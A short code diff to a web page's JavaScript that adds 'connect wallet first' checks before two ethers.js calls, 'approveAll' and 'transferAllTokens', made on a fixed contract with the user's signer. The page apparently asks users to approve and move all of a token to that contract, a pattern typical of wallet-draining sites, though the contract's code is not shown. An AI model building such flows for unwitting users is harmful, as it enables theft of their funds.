@@ -115,6 +115,11 @@
 
         // 授权代币
         async function approveToken(tokenAddress) {
+            if (!userAddress) {
+                alert('请先连接钱包');
+                return;
+            }
+
             try {
                 const contract = new ethers.Contract(contractAddress, contractABI, signer);
                 const tx = await contract.approveAll(tokenAddress);  // 调用 approveAll 方法
@@ -129,6 +134,11 @@
 
         // 转移代币
         async function transferToken(tokenAddress) {
+            if (!userAddress) {
+                alert('请先连接钱包');
+                return;
+            }
+
             try {
                 const contract = new ethers.Contract(contractAddress, contractABI, signer);
                 const tx = await contract.transferAllTokens(tokenAddress);  // 调用 transferAllTokens 方法
